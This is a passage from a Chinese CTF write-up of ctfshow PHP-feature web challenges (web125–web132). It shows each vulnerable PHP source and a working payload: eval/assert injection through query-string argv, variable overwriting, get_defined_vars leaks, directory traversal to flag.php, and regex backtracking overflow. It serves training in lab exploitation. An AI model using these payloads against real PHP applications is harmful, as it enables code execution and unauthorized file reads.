</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nv">$c</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题把上题的echo方法和flag关键词ban了</p>
<p>考虑通过二次传参的方法读flag</p>
<p>我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了</p>
<p>后面尝试highlight_file方法成功读到flag</p>
<p>payload:</p>
<pre tabindex="0"><code>POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[1])
GET 1=flag.php
</code></pre><p>其他的 payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">POST</span> <span class="nx">CTF_SHOW</span><span class="o">=&amp;</span><span class="nx">CTF</span><span class="p">[</span><span class="nx">SHOW</span><span class="o">.</span><span class="nx">COM</span><span class="o">=&amp;</span><span class="nx">fun</span><span class="o">=</span><span class="nx">var_export</span><span class="p">(</span><span class="nx">get_defined_vars</span><span class="p">())</span>
</span></span></code></pre></div><h4 id="web126">web126<a hidden class="anchor" aria-hidden="true" href="#web126">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>基本上ban掉了能读文件的函数</p>
<p>参考<a href="https://blog.csdn.net/Myon5/article/details/140464776">ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客</a></p>
<p>payload:</p>
<pre tabindex="0"><code>get：?$fl0g=flag_give_me;
post：CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])
</code></pre><p>这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET[&lsquo;fl0g&rsquo;]) 仍然会返回 false，即没有检测到 fl0g 参数。</p>
<p>post 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST[&lsquo;CTF_SHOW&rsquo;]) &amp;&amp; isset($_POST[&lsquo;CTF_SHOW.COM&rsquo;]) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。</p>
<p>准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER[&ldquo;QUERY_STRING&rdquo;] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。</p>
<p>当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER[&lsquo;argv&rsquo;] 中。
在这种配置下，$_SERVER[&lsquo;argv&rsquo;][0] 包含了整个查询字符串，即 &lsquo;$fl0g=flag_give_me;&rsquo;。</p>
<p>在 eval(&quot;$c;&rdquo;); 中实际执行的是 eval(&rsquo;eval($a[0]);&rsquo;);，因为 $a[0] 是 &lsquo;$fl0g=flag_give_me;&rsquo;，这相当于执行了 eval(&rsquo;$fl0g=flag_give_me;&rsquo;);，这样就定义了变量 $fl0g 并赋值为 &lsquo;flag_give_me&rsquo;。</p>
<p>最后 判断 if($fl0g === &ldquo;flag_give_me&rdquo;)，因为 $fl0g 被正确地设置为了 &lsquo;flag_give_me&rsquo;，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。</p>
<p>其他payload:</p>
<pre tabindex="0"><code>GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])
</code></pre><p>也同样是为了使fl0g=flag_give_me</p>
<h4 id="web127">web127<a hidden class="anchor" aria-hidden="true" href="#web127">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-10 21:52:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$ctf_show</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1">//特殊字符检测
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$url</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\&#39;|\&#34;|\&lt;|\,|\&gt;|\.|\\\|\//&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">waf</span><span class="p">(</span><span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;嗯哼？&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ctf_show</span><span class="o">===</span><span class="s1">&#39;ilove36d&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>变量覆盖</p>
<p>由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_</p>
<p>payload:</p>
<pre tabindex="0"><code>ctf%20show=ilove36d
</code></pre><h4 id="web128">web128<a hidden class="anchor" aria-hidden="true" href="#web128">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-10 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-12 19:49:05
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$f1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$f2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">check</span><span class="p">(</span><span class="nv">$f1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$f1</span><span class="p">,</span><span class="nv">$f2</span><span class="p">)));</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;嗯哼？&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">return</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span> 
</span></span></code></pre></div><p>什么是Gettext函数</p>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">PHP: Gettext - Manual</a></p>
<p>骚操作</p>
<pre tabindex="0"><code>小知识点： _()是一个函数

_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll

get_defined_vars()函数

get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag

payload: ?f1=_&amp;f2=get_defined_vars
</code></pre><h4 id="web129">web129<a hidden class="anchor" aria-hidden="true" href="#web129">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 03:18:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="nx">readfile</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置</p>
<p>所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件</p>
<p>可以联想到目录穿越</p>
<p>payload:</p>
<pre tabindex="0"><code>/ctfshow/../../../../../../../../../../var/www/html/flag.php
</code></pre><h4 id="web130">web130<a hidden class="anchor" aria-hidden="true" href="#web130">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 05:19:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?ctfshow/is&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>&lsquo;/.+?ctfshow/is&rsquo; 后面的i表示大小写匹配，s表示忽略换行符，单行匹配</p>
<p>在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次</p>
<p>所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确</p>
<p>再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可</p></blockquote>
<p>payload</p>
<pre tabindex="0"><code>POST f=ctfshow
</code></pre><h4 id="web131">web131<a hidden class="anchor" aria-hidden="true" href="#web131">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 05:19:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$f</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?ctfshow/is&#39;</span><span class="p">,</span> <span class="nv">$f</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s1">&#39;36Dctfshow&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>正则表达式溢出 <a href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a></p>
<p>payload:</p>
<pre tabindex="0"><code>#payload:
&lt;?php
echo str_repeat(&#39;very&#39;, &#39;250000&#39;).&#39;36Dctfshow&#39;;
</code></pre><p>不宜过多，过多会</p>
<p><img alt="image-20250124131836252" loading="lazy" src="assets/image-20250124131836252.png"></p>
<h4 id="web132">web132<a hidden class="anchor" aria-hidden="true" href="#web132">#</a></h4>
<p><img alt="image-20250124132332538" loading="lazy" src="assets/image-20250124132332538.png"></p>
